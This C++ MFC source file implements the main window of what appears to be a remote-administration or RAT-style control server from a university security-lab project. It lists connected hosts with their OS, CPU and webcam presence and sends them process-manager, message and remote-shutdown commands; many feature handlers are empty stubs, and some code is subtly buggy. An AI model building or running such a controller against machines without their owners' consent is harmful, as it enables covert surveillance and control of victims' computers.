
// SamSung DiveDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "SamSung Dive.h"
#include "SamSung DiveDlg.h"
#include "afxdialogex.h" 
#include"ServerManagerDlg.h"
#include"IocpServer.h"
#include"Common.h"
#include"Login.h"
#include"resource.h"
#include"InstantMessageDlg.h"
#include"ProcessManagerDlg.h"
#include"ChangeMemoryDlg.h"
CSamSungDiveDlg* __ServerProjectDlg = NULL;
#ifdef _DEBUG
#define new DEBUG_NEW
#endif



#define UM_NOTIFY_ICON_DATA WM_USER+1
COLUMN_DATA __ClientInfoList[] =
{
	{ "IP",			120 },
	{ "area",			50 },
	{ "Computer",	160 },
	{ "OS",		128 },
	{ "CPU",			180 },
	{ "Cramera",		81 },
	{ "PING",			151 }
};
COLUMN_DATA __ServerInfoList[] =
{
	{ "InfoType",		200 },
	{ "Time",			200 },
	{ "Information",	    490 }
};
//静态全局变量 为了让当前的全局变量在其他的cpp文件中被使用（静态全局变量作用域仅在当前文件中）
static UINT __Indicators[] =
{
	IDR_STATUSBAR_SERVER_STRING
};
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CSamSungDiveDlg 对话框



CSamSungDiveDlg::CSamSungDiveDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_SAMSUNG_DIVE_DIALOG, pParent)
{
	m_ListenPort =0;
	m_MaxConnections =0;
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CSamSungDiveDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CLIENT_INFO_LIST, m_ClientInfo_List);    //控件ID与控件变量关联（分为静态关联与动态关联，此处为静态关联）
	DDX_Control(pDX, IDC_SERVER_INFO_LIST, m_ServerInfo_List);
}

BEGIN_MESSAGE_MAP(CSamSungDiveDlg, CDialogEx)     //消息关联
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_TIMER()
	ON_COMMAND(ID_Local_Settings, &CSamSungDiveDlg::OnLocalSettings)
	ON_COMMAND(ID_Add_Test_Info, &CSamSungDiveDlg::OnAddTestInfo)
	ON_COMMAND(ID_Exit_Program, &CSamSungDiveDlg::OnExitProgram)
	ON_WM_CLOSE()

	//真彩button的消息映射
	ON_COMMAND(ID_CMD_MANAGER, &CSamSungDiveDlg::OnButtonCmdManager)
	ON_COMMAND(ID_PROCESS_MANAGER, &CSamSungDiveDlg::OnButtonProcessManager)
	ON_COMMAND(ID_WINDOW_MANAGER, &CSamSungDiveDlg::OnButtonWindowManager)
	ON_COMMAND(ID_REMOTE_CONTROL, &CSamSungDiveDlg::OnButtonRemoteControl)
	ON_COMMAND(ID_FILE_MANAGER, &CSamSungDiveDlg::OnButtonFileManager)
	ON_COMMAND(ID_AUDIO_MANAGER, &CSamSungDiveDlg::OnButtonAudioManager)
	ON_COMMAND(ID_CLEAN_MANAGER, &CSamSungDiveDlg::OnButtonCleanManager)
	ON_COMMAND(ID_VIDEO_MANAGER, &CSamSungDiveDlg::OnButtonVideoManager)
	ON_COMMAND(ID_SERVICE_MANAGER, &CSamSungDiveDlg::OnButtonServiceManager)
	ON_COMMAND(ID_REGISTER_MANAGER, &CSamSungDiveDlg::OnButtonRegisterManager)
	ON_COMMAND(ID_SERVER_MANAGER, &CSamSungDiveDlg::OnButtonServerManager)
	ON_COMMAND(ID_CLIENT_MANAGER, &CSamSungDiveDlg::OnButtonClientManager)
	ON_COMMAND(ID_SERVER_ABOUT, &CSamSungDiveDlg::OnButtonServerAbout)
	
	//
	ON_MESSAGE(UM_NOTIFY_ICON_DATA, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnNotifyIconData)

	 
	ON_COMMAND(ID_Show, &CSamSungDiveDlg::OnShow)
	ON_COMMAND(ID_Hide, &CSamSungDiveDlg::OnHide)
	ON_MESSAGE(UM_CLIENT_LOGIN,OnClientLogin)
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_CLIENT_INFO_LIST, &CSamSungDiveDlg::OnNMRClickClientInfoList)
	ON_COMMAND(ID_DELETE_CLIENT_INFO, &CSamSungDiveDlg::OnDeleteClientInfo)
	ON_COMMAND(ID_INSTANT_MESSAGE, &CSamSungDiveDlg::OnInstantMessage)
	ON_COMMAND(ID_REMOTE_SHUTDOWN, &CSamSungDiveDlg::OnRemoteShutdown)

	ON_MESSAGE(UM_OPEN_REMOTE_MESSAGE_DIALOG, OnOpenInstantMessageDialog)
	ON_MESSAGE(UM_OPEN_PROCESS_MANAGER_DIALOG, OnOpenProcessManagerDialog)
END_MESSAGE_MAP()


// CSamSungDiveDlg 消息处理程序

BOOL CSamSungDiveDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);


	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	SetTimer(0, 1000, NULL);
	GetSystemTime();


	//在MainDlg初始化函数中进行ConfigFile对象的调用 获取数据存储到类成员变量中
	m_ConfigFile.GetIntFromConfigFile(_T("Settings"), _T("ListenPort"), (int*) & m_ListenPort);
	m_ConfigFile.GetIntFromConfigFile(_T("Settings"), _T("MaxConnections"), (int*) & m_MaxConnections);

	
	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	__ServerProjectDlg = this;        //构造函数中也可以
	InitListCtrl();
	InitSolidMenu();
	InitTrueColorBar();
	InitNotifyIconData();
	InitStatusBar();
	ServerStart();
	// TODO: 在此添加额外的初始化代码
	
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CSamSungDiveDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CSamSungDiveDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CSamSungDiveDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CSamSungDiveDlg::ServerStart()
{
	//通信
	m_IocpServer= new CIocpServer; 
	if (m_IocpServer== NULL)
	{
		return;
	}
	if (m_IocpServer->ServerRun(m_ListenPort,WndCallback) == TRUE)   //设置Dlg当前获取到 ushort 65535 监听端口
	{

	}

	//显示服务端信息
	CString v1;
	v1.Format(_T("监听端口：%d成功  最大连接数：%d"  ),m_ListenPort,m_MaxConnections);
	DisplayMainDlgInfo(TRUE, v1);
}

VOID CALLBACK CSamSungDiveDlg::WndCallback(PCONTEXT_OBJECT ContextObject)   //静态成员函数(线程回调函数与窗口回调函数都要定义为静态成员函数)
{
	//IocpServer类中与窗口交互的函数

	WndHandleIO(ContextObject);         //静态成员函数调用 学习点
	


}
VOID CSamSungDiveDlg::WndHandleIO(CONTEXT_OBJECT* ContextObject)
{
	if (ContextObject == NULL)
	{
		return;
	}


	if (ContextObject->DlgIdentity > 0)
	{
		switch (ContextObject->DlgIdentity)
		{

		case CMD_MANAGER_DIALOG:
		{
			
			break;
		}
		case PROCESS_MANAGER_DIALOG:
		{
			CProcessManagerDlg* Dialog = (CProcessManagerDlg*)ContextObject->DlgHandle;
			Dialog->OnReceiveComplete();
			
			break;
		}
		}
		ContextObject->DlgIdentity = 0;
		
	}
	switch (ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])   //[13][]
	{
		case CLIENT_LOGIN:   //用户登录请求
		{

		//调用类窗口中的非静态成员函数


		//消息函数  来实现窗口中的函数调用
		__ServerProjectDlg->PostMessageA(UM_CLIENT_LOGIN,
			NULL, (LPARAM)ContextObject);   //使用自定义消息

		break;
		}
		case CLIENT_SHUT_DOWN_REPLY:
		{

			CancelIo((HANDLE)ContextObject->ClientSocket);  //回收在当前对象上的异步请求
			closesocket(ContextObject->ClientSocket);
			ContextObject->ClientSocket = NULL;
			Sleep(10);

			break;
		}
		case CLIENT_GET_OUT_REPLY:
		{
			CancelIo((HANDLE)ContextObject->ClientSocket);  //回收在当前对象上的异步请求
			closesocket(ContextObject->ClientSocket);
			ContextObject->ClientSocket = NULL;
			Sleep(10);
			break;
		}
		case CLIENT_REMOTE_MESSAGE_REPLY:
		{

			__ServerProjectDlg->PostMessage(UM_OPEN_REMOTE_MESSAGE_DIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case CLIENT_PROCESS_MANAGER_REPLY:
		{
			__ServerProjectDlg->PostMessage(UM_OPEN_PROCESS_MANAGER_DIALOG, 0, (LPARAM)ContextObject);
			break;
		}
		case CLIENT_FIRST_SCAN_REPLY:
		{
			CChangeMemoryDlg* Dialog = (CChangeMemoryDlg*)ContextObject->ChangeMemoryDlg;
			Dialog->ShowAddressInfoList();

			break;
		}
		case CLIENT_SCAN_AGAIN_REPLY:
		{
			CChangeMemoryDlg* Dialog = (CChangeMemoryDlg*)ContextObject->ChangeMemoryDlg;
			Dialog->ShowAddressInfoList();

			break;
		}
		case CLIENT_VIRTUAL_MEMORY_MAPPING_REPLY:
		{
			CVMMapDlg* Dialog = (CVMMapDlg*)ContextObject->VMMapDlg;
			Dialog->ShowClientInfo();
		}
		case CLIENT_UPDATE_VMMAP_SYSTEM_INFO_REPLY:
		{
			CVMMapDlg* Dialog = (CVMMapDlg*)ContextObject->VMMapDlg;
			Dialog->UpdateSystemInfo();
		}
		


	}


}
void CSamSungDiveDlg::InitListCtrl()
{
	for (int i = 0; i < sizeof(__ClientInfoList) / sizeof(COLUMN_DATA); i++)
	{
		m_ClientInfo_List.InsertColumn(i, __ClientInfoList[i].TitleData,	LVCFMT_CENTER, __ClientInfoList[i].TitleWidth);
	}
	m_ClientInfo_List.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	for (int i = 0; i < sizeof(__ServerInfoList) / sizeof(COLUMN_DATA); i++)
	{
		m_ServerInfo_List.InsertColumn(i, __ServerInfoList[i].TitleData, LVCFMT_CENTER,
			__ServerInfoList[i].TitleWidth);
	}
	m_ServerInfo_List.SetExtendedStyle(LVS_EX_FULLROWSELECT);

}

void CSamSungDiveDlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (nIDEvent == 0)
	{
		GetSystemTime();

	}
	CDialogEx::OnTimer(nIDEvent);
}

void CSamSungDiveDlg::OnLocalSettings()
{
	// TODO: 在此添加命令处理程序代码
}

void CSamSungDiveDlg::OnAddTestInfo()
{
	// TODO: 在此添加命令处理程序代码
	//int i = m_ServerInfo_List.InsertItem(m_ServerInfo_List.GetItemCount(), "张飞");  //把张飞插入到第几排
	//m_ServerInfo_List.SetItemText(i, 1, "23");
	//m_ServerInfo_List.SetItemText(i, 2, "车骑将军");
	//m_ServerInfo_List.SetItemText(i, 3, "蜀");

}

void CSamSungDiveDlg::OnExitProgram()
{
	// TODO: 在此添加命令处理程序代码

	SendMessage(WM_CLOSE);						//消息函数调用方法SendMessage()

}

void CSamSungDiveDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	//
	// 
	// ("OnClose");


	if (m_IocpServer != NULL)
	{
		delete m_IocpServer;
		m_IocpServer = NULL;
	}
	//关闭时钟资源
	KillTimer(0);									//关闭时钟对象并且回收资源
	Shell_NotifyIcon(NIM_DELETE, &m_NotifyIconData);//关闭窗口，销毁托盘对象资源


	CDialogEx::OnClose();
}




//自定义函数
//获取系统当前时间
void CSamSungDiveDlg::GetSystemTime( )
{
	auto  Object = time(NULL);   //自动类型推断(Time的对象)   
	tm v1;
	char  v2[MAX_PATH];
	localtime_s(&v1, &Object);
	strftime(v2, _countof(v2), "%Y-%m-%d %H:%M:%S", &v1);   //获得的时间v1以该格式进行字符串格式化
	SetWindowText(v2); //设置到主窗口的标题栏上
}
//初始化固态菜单
void CSamSungDiveDlg::InitSolidMenu()
{
	HMENU  MenuObject;    //定义一个菜单对象    将数据型数据转换成字符型数据
	MenuObject = LoadMenu(NULL, MAKEINTRESOURCE(IDR_SERVER_DIALOG_MAIN_MENU));        //将菜单对象载入菜单资源   将资源ID转换成字符型数据
	::SetMenu(this->GetSafeHwnd(), MenuObject);                                       //将带有资源的菜单对象设置到当前主窗口句柄上
	::DrawMenuBar(this->GetSafeHwnd());

}
//初始化真彩栏Bar
void CSamSungDiveDlg::InitTrueColorBar()
{
	if (!m_TrueColorBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC))  //创建一个工具条  加载资源
	{

		return;
	}

	if (!m_TrueColorBar.LoadToolBar(IDR_SERVER_DIALOG_TOOLBAR))
	{
		return;
	}

	m_TrueColorBar.LoadTrueColorToolBar
	(
		48,											//加载真彩工具条
		IDB_SERVER_DIALOG_BITMAP,
		IDB_SERVER_DIALOG_BITMAP,
		IDB_SERVER_DIALOG_BITMAP					//在资源视图中让文件图片与该ID相关联
	);  

	RECT v1, v2;   //设置矩形对象
	GetWindowRect(&v2);   //得到整个窗口的大小
	v1.left = 0;
	v1.top = 0;
	v1.bottom = 80;
	v1.right = v2.right - v2.left + 10;
	m_TrueColorBar.MoveWindow(&v1, TRUE);    //将真彩栏设置到矩形v1范围内

	m_TrueColorBar.SetButtonText(0, "终端管理");     //在位图的下面添加中文
	m_TrueColorBar.SetButtonText(1, "进程管理");
	m_TrueColorBar.SetButtonText(2, "窗口管理");
	m_TrueColorBar.SetButtonText(3, "桌面管理");
	m_TrueColorBar.SetButtonText(4, "文件管理");
	m_TrueColorBar.SetButtonText(5, "语音管理");
	m_TrueColorBar.SetButtonText(6, "系统清理");
	m_TrueColorBar.SetButtonText(7, "视频管理");
	m_TrueColorBar.SetButtonText(8, "服务管理");
	m_TrueColorBar.SetButtonText(9, "注册表管理");
	m_TrueColorBar.SetButtonText(10, "服务端设置");
	m_TrueColorBar.SetButtonText(11, "客户端设置");
	m_TrueColorBar.SetButtonText(12, "帮助");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示以上中文
}
//初始化托盘
void CSamSungDiveDlg::InitNotifyIconData()
{
	//定义托盘类成员变量
	m_NotifyIconData.cbSize = sizeof(NOTIFYICONDATA);
	m_NotifyIconData.hWnd = m_hWnd;
	m_NotifyIconData.uID = IDR_MAINFRAME;
	m_NotifyIconData.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;  //气泡提示
	m_NotifyIconData.uCallbackMessage = UM_NOTIFY_ICON_DATA;   //自定义消息  与该消息要关联消息处理函数       
	m_NotifyIconData.hIcon = m_hIcon;
	CString v1 = "长安大学安全实验室";
	lstrcpyn(m_NotifyIconData.szTip, v1, sizeof(m_NotifyIconData.szTip) / sizeof(m_NotifyIconData.szTip[0]));  //拷贝
	Shell_NotifyIcon(NIM_ADD, &m_NotifyIconData);         //显示托盘
}
VOID CSamSungDiveDlg::InitStatusBar()
{
	//成员函数  
	//消息函数(声明  Mapping  实现)  Static函数(声明 实现)  普通函数(声明 实现 自定义消息函数)
	//MFC 成员变量  
	//

	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(__Indicators,
			sizeof(__Indicators) / sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		return;
	}
	CRect v1;    //矩形类
	GetWindowRect(&v1); //Top Left Bottom Rigth   
	v1.bottom += 1;     //没有任何意义  触发OnSize立即执行
	MoveWindow(v1);
}
void CSamSungDiveDlg::DisplayMainDlgInfo(BOOL IsOK, CString& Message)
{
	CTime Object = CTime::GetCurrentTime();        //强制调用CTime类中该函数    
	CString v1;
	CString v2 = Object.Format("%H:%M:%S");        //将获得的时间以该格式进行字符串格式化'

	if (IsOK)
	{
		v1 = _T("执行成功");
	}
	else
	{
		v1 = _T("执行失败");
	}


	m_ServerInfo_List.InsertItem(0, v1);    //向控件中设置数据
	m_ServerInfo_List.SetItemText(0, 1, v2);
	m_ServerInfo_List.SetItemText(0, 2, Message);

	if (Message.Find("上线") > 0)         //处理上线还是下线消息
	{
		m_ConnectionCount++;
	}
	else if (Message.Find("下线") > 0)
	{
		m_ConnectionCount--;
	}
	else if (Message.Find("断开") > 0)
	{
		m_ConnectionCount--;
	}
	CString v3;
	m_ConnectionCount = (m_ConnectionCount <= 0 ? 0 : m_ConnectionCount);     //防止iCount有-1的情况
	v3.Format("有%d个主机在线", m_ConnectionCount);
	m_StatusBar.SetPaneText(0, v3);     //在状态条上显示文字

}
void CSamSungDiveDlg::OnNotifyIconData(WPARAM wParam, LPARAM lParam)
{
	switch ((UINT)lParam)   //判断动作
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONDBLCLK:
	{
		if (!IsWindowVisible())  //当前主对话框是否是显示状态
		{
			//窗口不显示
			ShowWindow(SW_SHOW);
		}
		else
		{
			ShowWindow(SW_HIDE);
		}
		break;
	}
	case WM_RBUTTONDOWN:
	{

		//动态加载菜单
		CMenu Menu;
		Menu.LoadMenu(IDR_NOTIFY_ICON_DATA_MENU);
		CPoint Point;					 //x y
		GetCursorPos(&Point);			//获得鼠标位置   
		Menu.GetSubMenu(0)->TrackPopupMenu(
			TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
			Point.x, Point.y, this, NULL);

		break;
	}
	}
	
}


//主菜单消息函数实现
VOID CSamSungDiveDlg::OnButtonCmdManager()
{

}
VOID CSamSungDiveDlg::OnButtonProcessManager()
{
	BYTE	IsToken = CLIENT_PROCESS_MANAGER_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));  //Iocp将数据打包发送到客户端
}
VOID CSamSungDiveDlg::OnButtonWindowManager()
{
	return;
}

VOID CSamSungDiveDlg::OnButtonRemoteControl()
{
	return;
}

VOID CSamSungDiveDlg::OnButtonFileManager()
{
	return;
}
VOID CSamSungDiveDlg::OnButtonAudioManager()
{


	return;
}
VOID CSamSungDiveDlg::OnButtonCleanManager()
{

	// MessageBox("OnButtonCleanManager", "OnButtonCleanManager");
	return;
}
VOID CSamSungDiveDlg::OnButtonVideoManager()
{
	return;
}

VOID CSamSungDiveDlg::OnButtonServiceManager()
{


	return;
}
VOID CSamSungDiveDlg::OnButtonRegisterManager()
{
	return;
}

VOID CSamSungDiveDlg::OnButtonServerManager()
{

	CServerManagerDlg Object(this);    //创建子对话框的类对象    
	Object.DoModal();        //显示对话框 
	return;
}
//客户端生成
VOID CSamSungDiveDlg::OnButtonClientManager()
{

	return;
}
VOID CSamSungDiveDlg::OnButtonServerAbout()
{

	
	return;
}




void CSamSungDiveDlg::OnShow()
{
	// TODO: 在此添加命令处理程序代码
	if (!IsWindowVisible())  //当前主对话框是否是显示状态
	{
		//窗口不显示
		ShowWindow(SW_SHOW);
	}
}


void CSamSungDiveDlg::OnHide()
{
	// TODO: 在此添加命令处理程序代码
	if (IsWindowVisible())  //当前主对话框是否是显示状态
	{
		//窗口不显示
		ShowWindow(SW_HIDE);
	}
}
LRESULT CSamSungDiveDlg::OnClientLogin(WPARAM ParameterData1, LPARAM ParameterData2)     //自定义消息函数
{
	CString ClientAddress, ClientPosition, HostName, ProcessorName, IsWebCameraExist, WebSpeed, OsName;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)ParameterData2;         //注意这里的  ClientContext  正是发送数据时从列表里取出的数据
	if (ContextObject == NULL)
	{
		return -1;
	}
	CString	v1;
	try
	{
		int v20 = ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength();
		int v21 = sizeof(LOGIN_INFORMAITON);
		if (ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength() != sizeof(LOGIN_INFORMAITON))
		{
			return -1;
		}
		LOGIN_INFORMAITON* LoginInfo =
			(LOGIN_INFORMAITON*)ContextObject->m_ReceivedDecompressedBufferData.GetArray();
		sockaddr_in     v2;
		memset(&v2, 0, sizeof(v2));

		//分析客户端的IP地址
		int v3 = sizeof(sockaddr_in);
		getpeername(ContextObject->ClientSocket, (SOCKADDR*)&v2, &v3);
		ClientAddress = inet_ntoa(v2.sin_addr);

		//主机名称
		HostName = LoginInfo->HostName;

		switch (LoginInfo->OsVersionInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion <= 4)
			{
				OsName = "WindowsNT";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OsName = "Windows2000";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OsName = "WindowsXP";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OsName = "Windows2003";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OsName = "WindowsVista";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OsName = "Windows7";
			}

			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OsName = "Windows10";
			}

		}
		//CPU
		ProcessorName = LoginInfo->ProcessorName;
		//网速
		WebSpeed.Format("%d", LoginInfo->WebSpeed);
		IsWebCameraExist = LoginInfo->IsWebCameraExist ? "有" : "无";


		//数据分析

		//向控件添加数据
		AddClientInfo(ClientAddress, ClientPosition,
			HostName, OsName, ProcessorName,
			IsWebCameraExist, WebSpeed, ContextObject);    //最后一个参数 不显示 为了Socket
		//ContextObject 是放在控件中的隐藏项中
	}
	catch (...) {}

}

VOID CSamSungDiveDlg::AddClientInfo(CString ClientAddress, CString ClientPosition,
	CString HostName,
	CString OsName, CString ProcessorNameString, CString IsWebCameraExist,
	CString WebSpeed, CONTEXT_OBJECT* ContextObject)
{
	//默认为0行  这样所有插入的新列都在最上面
	int i = m_ClientInfo_List.InsertItem(m_ClientInfo_List.GetItemCount(),
		ClientAddress);
	m_ClientInfo_List.SetItemText(i, 2, HostName);
	m_ClientInfo_List.SetItemText(i, 3, OsName);
	m_ClientInfo_List.SetItemText(i, 4, ProcessorNameString);
	m_ClientInfo_List.SetItemText(i, 5, IsWebCameraExist);
	m_ClientInfo_List.SetItemText(i, 6, WebSpeed);

	m_ClientInfo_List.SetItemData(i, (ULONG_PTR)ContextObject);  //将ContextObject插入到该排的隐藏区  删除

	DisplayMainDlgInfo(TRUE, ClientAddress + "主机上线");
}

void CSamSungDiveDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (m_StatusBar.m_hWnd != NULL)                         //状态栏
	{
		CRect Rect;
		Rect.top = cy - 20;
		Rect.left = 0;
		Rect.right = cx;
		Rect.bottom = cy;
		m_StatusBar.MoveWindow(Rect);
		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_POPOUT, cx);
	}
}


void CSamSungDiveDlg::OnNMRClickClientInfoList(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码

	CMenu Menu;
	Menu.LoadMenuA(IDR_CLIENT_INFO_LIST_MENU);
	CPoint Point;    //x  y
	GetCursorPos(&Point);    //获得鼠标位置
	Menu.GetSubMenu(0)->TrackPopupMenu(
		TPM_LEFTBUTTON | TPM_RIGHTBUTTON,
		Point.x, Point.y, this, NULL
	);


	*pResult = 0;
}

//事件处理消息函数
void CSamSungDiveDlg::OnDeleteClientInfo()
{
	// TODO: 在此添加命令处理程序代码

	//发送数据到客户端
	BYTE IsToken = CLIENT_GET_OUT_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));   //构建客户端数据包

	//清除ListControl列表
	CString  ClientAddress;
	int SelectedCount = m_ClientInfo_List.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Position = m_ClientInfo_List.GetFirstSelectedItemPosition();  //Position是被选择的次序，Item是实际位置
		int Item = m_ClientInfo_List.GetNextSelectedItem(Position);
		ClientAddress = m_ClientInfo_List.GetItemText(Item, 0);   //第几排  第0列
		//销毁列表项
		m_ClientInfo_List.DeleteItem(Item);
		ClientAddress += "强制断开";
		DisplayMainDlgInfo(TRUE, ClientAddress);
	}

}


void CSamSungDiveDlg::OnInstantMessage()
{
	// TODO: 在此添加命令处理程序代码
	BYTE IsToken = CLIENT_REMOTE_MESSAGE_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));
}


void CSamSungDiveDlg::OnRemoteShutdown()
{
	// TODO: 在此添加命令处理程序代码

	BYTE IsToken = CLIENT_SHUT_DOWN_REQUIRE;
	SendingSelectedCommand(&IsToken, sizeof(BYTE));


	CString  ClientAddress;
	int SelectedCount = m_ClientInfo_List.GetSelectedCount();
	int i = 0;
	for (i = 0; i < SelectedCount; i++)
	{
		POSITION Position = m_ClientInfo_List.GetFirstSelectedItemPosition();
		int Item = m_ClientInfo_List.GetNextSelectedItem(Position);
		ClientAddress = m_ClientInfo_List.GetItemText(Item, 0);
		m_ClientInfo_List.DeleteItem(Item);
		ClientAddress += "强制断开";
		DisplayMainDlgInfo(TRUE, ClientAddress);
	}
}


//将数据包发送至客户端
VOID CSamSungDiveDlg::SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength)
{

	//从ListControl上的隐藏项中选取中Context
	POSITION Position = m_ClientInfo_List.GetFirstSelectedItemPosition();
	//该代码支持多项选择
	while (Position)
	{
		int	Item = m_ClientInfo_List.GetNextSelectedItem(Position);
		//获得该排的隐藏数据项得到Context
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_ClientInfo_List.GetItemData(Item);   //上线显示的函数中插入一个Context隐藏数据


		//通信类负责发送数据
		m_IocpServer->OnPrepareSending(ContextObject, BufferData, BufferLength);

	}
}

LRESULT CSamSungDiveDlg::OnOpenInstantMessageDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;

	//动态窗口  
	CInstantMessageDlg* Dialog = new CInstantMessageDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为桌面
	Dialog->Create(IDD_INSTANT_MESSAGE_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);

	return 0;
}
LRESULT CSamSungDiveDlg::OnOpenProcessManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2)
{
	//创建一个远程消息对话框
	PCONTEXT_OBJECT ContextObject = (CONTEXT_OBJECT*)ParameterData2;

	//动态窗口  
	CProcessManagerDlg* Dialog = new CProcessManagerDlg(this, m_IocpServer, ContextObject);
	// 设置父窗口为桌面
	Dialog->Create(IDD_PROCESS_MANAGER_DIALOG, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);

	if (ContextObject != NULL)
	{
		ContextObject->DlgIdentity = PROCESS_MANAGER_DIALOG;
		ContextObject->DlgHandle = Dialog;
	}

	return 0;
}